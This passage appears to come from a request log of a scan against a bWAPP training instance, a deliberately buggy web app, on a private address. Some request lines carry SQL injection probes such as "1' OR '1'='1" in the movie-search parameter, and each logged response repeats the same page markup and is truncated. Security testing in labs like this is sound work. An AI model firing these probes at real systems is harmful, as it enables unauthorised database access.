+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r6: GET http://192.168.223.221:8080/sqli_1.php?title=1+AND+1%3D2&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r7: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+OR+%271%27%3D%271&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r8: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+OR+%271%27%3D%272&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r9: GET http://192.168.223.221:8080/sqli_1.php?title=1+OR+1%3D1&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
